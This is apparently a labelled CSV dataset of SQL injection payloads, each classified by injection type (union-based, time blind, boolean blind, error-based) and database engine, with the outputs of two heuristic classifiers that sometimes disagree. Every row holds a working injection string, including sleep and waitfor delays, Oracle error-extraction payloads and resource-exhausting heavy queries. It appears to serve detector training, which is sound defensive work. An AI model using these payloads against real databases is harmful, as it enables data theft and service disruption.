payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" where 8727 = 8727",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,610,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 8727 = 8727"
select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,611,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf
"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,612,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'"
-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,613,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230
"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,614,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#"
"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,615,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--"
"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,616,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"
"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,617,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl"
"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,618,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#"
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,619,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#"
-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,620,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --
"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,621,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"
"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,622,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--"
"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,623,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#"
-7940' ) union all select 6024--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,624,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-7940' ) union all select 6024--
"1"" ) where 2758 = 2758 union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,625,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 2758 = 2758 union all select null,null,null,null,null,null,null--"
1%' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,626,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1%' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and '%' = '
"1%"" ) ) ) union all select null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,627,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) ) union all select null#"
"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,628,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
( select * from ( select ( sleep ( 5 ) ) ) srmq ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,629,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select * from ( select ( sleep ( 5 ) ) ) srmq ) --
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,630,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#"
"-9622' union all select 7208,7208,7208,7208#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,631,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9622' union all select 7208,7208,7208,7208#"
"1', ( select ( case when ( 6894 = 6087 ) then 1 else 6894* ( select 6894 from information_schema.character_sets ) end ) )",boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,632,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,"1', ( select ( case when ( 6894 = 6087 ) then 1 else 6894* ( select 6894 from information_schema.character_sets ) end ) )"
"1"" ) where 9285 = 9285 and 8506 = 8343#",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,633,boolean_blind,generic,Pattern match: 'and 8506 = 8343' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) where 9285 = 9285 and 8506 = 8343#"
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,634,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq
-6200%' ) ) or 8077 = 4661,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,635,boolean_blind,generic,Pattern match: 'or 8077 = 4661' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6200%' ) ) or 8077 = 4661
1 ) rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,636,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) rlike sleep ( 5 ) #
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,637,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--"
1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,638,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618
1' ) as zxos where 2745 = 2745,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,639,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as zxos where 2745 = 2745
"-6846%"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""%"" = """,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,640,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-6846%"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""%"" = """
"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj",boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,641,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj"
1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,642,boolean_blind,generic,Pattern match: 'and 7017 = 7358' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) as sfan where 7176 = 7176 and 7017 = 7358
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,643,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih"
"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,644,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy"
"1' and make_set ( 3445 = 5963,5963 ) and 'wjfw' = 'wjfw",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,645,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' and make_set ( 3445 = 5963,5963 ) and 'wjfw' = 'wjfw"
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,646,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,647,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj"
"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 = 8517",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,648,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 = 8517"
"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,649,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#"
select ( case when ( 6434 = 3877 ) then 6434 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,650,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 6434 = 3877 ) then 6434 else 1/ ( select 0 ) end ) --
"-7794"" ) union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,651,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7794"" ) union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#"
1 ) ) as mlpf where 7425 = 7425,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,652,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as mlpf where 7425 = 7425
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,653,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk
1 ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,654,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) ) ) waitfor delay '0:0:5'--
"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,655,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )"
-9336' or 5641 = 9488#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,656,boolean_blind,generic,Pattern match: 'or 5641 = 9488' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9336' or 5641 = 9488#
"1"" where 7045 = 7045",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,657,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 7045 = 7045"
"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,658,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc"
-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,659,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj
"1"" ) union all select null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,660,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) union all select null#"
"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,661,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#"
